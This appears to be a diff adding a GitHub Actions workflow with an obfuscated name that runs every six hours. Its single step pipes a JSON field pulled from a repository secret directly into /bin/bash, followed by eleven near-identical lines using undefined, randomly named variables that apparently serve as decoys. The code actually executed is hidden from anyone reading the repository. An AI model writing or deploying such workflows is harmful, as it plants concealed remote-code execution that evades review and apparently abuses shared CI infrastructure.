@@ -1,0 +1,29 @@
+name: yelanwotingg
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yelanwotingg
+        env:
+          kafc81: ${{ secrets.kafc81 }}
+        run: |
+          echo $kafc81 | jq -r .qr30 | /bin/bash
+          echo $vt0 | jq -r .cgzr87 | /bin/bash
+          echo $g234 | jq -r .l029 | /bin/bash
+          echo $cclf80419 | jq -r .bgar76 | /bin/bash
+          echo $lut7 | jq -r .sxj130 | /bin/bash
+          echo $gjkdf426 | jq -r .wwm740 | /bin/bash
+          echo $hk03901 | jq -r .n05835 | /bin/bash
+          echo $fhyv4 | jq -r .ihrq92407 | /bin/bash
+          echo $eri50677 | jq -r .oyk931 | /bin/bash
+          echo $hzir5107 | jq -r .mht44772 | /bin/bash
+          echo $dl869 | jq -r .rouqc2303 | /bin/bash
+          echo $ojzo5 | jq -r .tbmsn2 | /bin/bash
+
